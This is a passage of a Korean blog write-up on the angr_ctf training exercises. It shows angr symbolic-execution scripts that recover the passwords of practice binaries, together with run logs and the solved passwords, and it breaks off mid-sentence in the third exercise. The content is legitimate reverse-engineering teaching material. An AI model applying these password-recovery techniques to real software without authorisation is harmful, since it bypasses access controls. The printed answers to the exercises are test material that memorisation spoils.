&#xC138;&#xD305;&#xD558;&#xB294;&#xB370;, &#xC774; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xB85C;&#xC2A4; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>maybe_good</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/4.png" alt="./anrgr_part3/Untitled%204.png"></p><p>&#xBCF4;&#xBA74; <code>should_succeed</code>&#xAC00; 0&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xC57C; &#x201C;Good Job&#x201D;&#xC774; &#xCD9C;&#xB825;&#xB418;&#xAC8C; &#xB418;&#xC5B4;&#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xBA74; <code>avoid_me</code>&#xB97C; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xB294; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xAC00; &#xD544;&#xC694;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = ???  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = ???  will_not_succeed_address = ???  simulation.explore(find=print_good_address, avoid=will_not_succeed_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>main &#xD568;&#xC218;&#xC758; &#xC55E; &#xBD80;&#xBD84;&#xC740; 0&#xBC88; &#xBB38;&#xC81C;&#xC640; &#xAC19;&#xC774; &#xC138;&#xD305;&#xD574;&#xC8FC;&#xACE0; &#xADF8; &#xB4A4;&#xB9CC; &#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs python">print_good_address = ???will_not_succeed_address = ???simulation.explore(find=print_good_address, avoid=will_not_succeed_address)</code></pre><p>&#xC774;&#xC81C; <code>explore</code> &#xD568;&#xC218;&#xC5D0; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC544;&#xAE4C; &#xBD84;&#xC11D;&#xD55C; <code>avoid_me</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xACE0; &#xCC3E;&#xC744; &#xC8FC;&#xC18C;&#xB294; &#xB611;&#xAC19;&#xC774; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="sol01-py"><a href="#sol01-py" class="headerlink" title="sol01.py"></a>sol01.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = <span class="hljs-number">0x080485E5</span>  will_not_succeed_address = <span class="hljs-number">0x080485A8</span>  simulation.explore(find=print_good_address, avoid=will_not_succeed_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))./<span class="hljs-number">01</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol01.py ./<span class="hljs-number">01</span>_angr_avoidWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">008</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">009</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80d4591</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">01</span>_angr_avoid (<span class="hljs-number">0x80d4591</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">26</span>,<span class="hljs-number">010</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80d4593</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">01</span>_angr_avoid (<span class="hljs-number">0x80d4593</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">29</span>,<span class="hljs-number">577</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff3d</span> <span class="hljs-keyword">with</span> <span class="hljs-number">11</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x818a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">29</span>,<span class="hljs-number">577</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff60</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x818a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))<span class="hljs-string">b&apos;HUJOZMYS&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">01</span>_angr_avoidEnter the password: HUJOZMYSGood Job.</code></pre><h1 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h1><p><img src="/2021/08/04/j0ker/angr_part3/5.png" alt="./angr_part3/Untitled%205.png"></p><p>&#xC74C;&#x2026;. &#xBB50;&#xC9C0;&#x2026; &#xC758;&#xB3C4;&#xAC00; &#xBB50;&#xC9C0;&#x2026; &#xBB38;&#xC81C;&#xB9CC; &#xBCF4;&#xACE0; &#xBAA8;&#xB974;&#xACA0;&#xC5B4;&#xC11C; &#xADF8;&#xB0E5; 1&#xBC88; &#xBB38;&#xC81C;&#xC5D0; &#xC8FC;&#xC18C;&#xB9CC; &#xBC14;&#xAFD4; &#xD480;&#xC5B4; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370;&#x2026; &#xD480;&#xB9BC;!!!</p><p>&#xBB50;&#xC57C; &#xBB54;&#xB370; &#xC65C; &#xD480;&#xB9AC;&#xB294;&#xAC74;&#xB370; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC558;&#xC8E0;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  # :boolean  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  # :boolean  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xD760;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>explore()</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC18C;&#xAC12;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xD568;&#xC218;&#xAC00; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xBABB; &#xCC3E;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC73C;&#xB2C8; &#xCD9C;&#xB825;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD1B5;&#xD574; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xB294; &#xCEE8;&#xB370;&#xC158;&#xC744; &#xCC3E;&#xC73C;&#xB77C;&#xB124;&#xC694;. &#xB124;. &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xD574;&#xC654;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; state&#xB97C; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xAC19;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xBB34;&#xC5C7;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xB290;&#xB0D0;&#xAC00; &#xB2EC;&#xB77C;&#xC9C4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; <code>stdout_output</code>&#xC5D0; &#x201C;Good Job&#x201D;&#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xB123;&#xC73C;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><pre><code class="hljs python"><span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output )</code></pre><p>&#xC88B;&#xC544;. &#xB9E4;&#xC6B0; &#xAE54;&#xB054;&#xD558;&#xAD70;.</p><p>&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xCC30;&#xB098; &#xC81C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC544;&#x2026; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xC81C;&#xB300;&#xB85C; &#xB418;&#xB294;&#xAC8C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xBCF4;&#xB2C8;&#xAE4C; <code>stdout_output</code>&#xC774; &#xBC14;&#xC774;&#xD2B8; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xB354;&#xB77C;&#xAD6C;&#xC694;? &#xADF8;&#xB798;&#xC11C; &#xC870;&#xAE08; &#xBC14;&#xAFD4;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )</code></pre><p>&#xAC00;&#xB9BF;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; 2&#xBC88; &#xBB38;&#xC81C;&#xB3C4; &#xC4F1;-&#xC2F9; &#xD074;&#xB9AC;&#xC5B4;~</p><h2 id="sol02-py"><a href="#sol02-py" class="headerlink" title="sol02.py"></a>sol02.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    print(stdout_output)    <span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    print(stdout_output)    <span class="hljs-keyword">return</span> ( <span class="hljs-string">&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>) )  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol02.py ./<span class="hljs-number">02</span>_angr_find_conditionWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">226</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">227</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804d291</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">02</span>_angr_find_condition (<span class="hljs-number">0x804d291</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">228</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804d293</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">02</span>_angr_find_condition (<span class="hljs-number">0x804d293</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">58</span>,<span class="hljs-number">865</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff2d</span> <span class="hljs-keyword">with</span> <span class="hljs-number">11</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">58</span>,<span class="hljs-number">865</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff50</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))<span class="hljs-string">b&apos;HETOBRCU&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">02</span>_angr_find_conditionEnter the password: HETOBRCUGood Job.</code></pre><h1 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h1><p><img src="/2021/08/04/j0ker/angr_part3/6.png" alt="./anrgr_part3/Untitled%206.png"></p><p>&#xC74C;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xD2B9;&#xC774;&#xD558;&#xAC8C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC774; &#xBCC0;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xAC8C; &#xB208;&#xC5D0; &#xB744;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC778;&#xD48B;&#xB3C4; &#xC880; &#xB2E4;&#xB974;&#xAC8C; &#xBC1B;&#xB294;&#xAC70; &#xAC19;&#xC740;&#xB370;&#x2026; <code>get_user_input()</code>&#xC744; &#xD568; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/7.png" alt="./anrgr_part3/Untitled%207.png"></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC55E;&#xC5D0;&#xC640;&#xB294; &#xB2EC;&#xB9AC; &#xC778;&#xD48B;&#xC744; 3&#xAC1C;&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; angr&#xC5D0;&#xC11C;&#xB294; <code>scanf</code>&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xD48B; &#xC5EC;&#xB7EC;&#xAC1C; &#xBC1B;&#xB294;&#xAC83;&#xC744; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;&#xACE0;? &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C;&#xD558;&#xB0D0;? &#xC77C;&#xB2E8; &#xC6D0;&#xB798; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xB294; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xC8E0;. &#xC774;&#xAC70;&#xB97C; <code>scanf</code> &#xD568;&#xC218; &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC778;&#xC790;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACF3;&#xC744; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB85C; &#xC120;&#xC5B8;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC8E0;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  # :integer (probably hexadecimal)  initial_state = project.factory.blank_state(addr=start_address)  password0_size_in_bits = ???  # :integer  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)  ...  initial_state.regs.??? = password0  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    ...    solution = ???  # :string    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xC8FC;&#xC18C;&#xBD80;&#xD130; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">start_address = <span class="hljs-number">0x08048980</span>  <span class="hljs-comment"># :integer (probably hexadecimal)</span>initial_state = project.factory.blank_state(addr=start_address)</code></pre><p>&#xC544;&#xAE4C; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xB2E4;&#xC2DC;&#xD53C; <code>scanf</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;, &#xBA54;&#xC778;&#xD568;&#xC218;&#xC5D0; &#xC788;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; <code>get_user_input</code>&#xC5D0; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xBA54;&#xC778; &#xD568;&#xC218;&#xC5D0; <code>get_user_input</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD73;&#xC774; <code>get_user_input</code> &#xC548;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC740; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xC73C;&#xB2C8;&#xAE4C;&#xC694;.</p><pre><code class="hljs python">password0_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)password1_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, password1_size_in_bits)password2_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, password2_size_in_bits)</code></pre><p>&#xC774;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC120;&#xC5B8;&#xB9CC; &#xD574;&#xC8FC;&#xB294; &#xAC70;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. angr&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xBCC0;&#xC218;&#xC758; type&#xC774; &#xBB54;&#xC9C0; &#xC2E0;&#xACBD; &#xC4F0;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xAE30;&#xB9CC; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; &#xBCC0;&#xC218;&#xB97C; 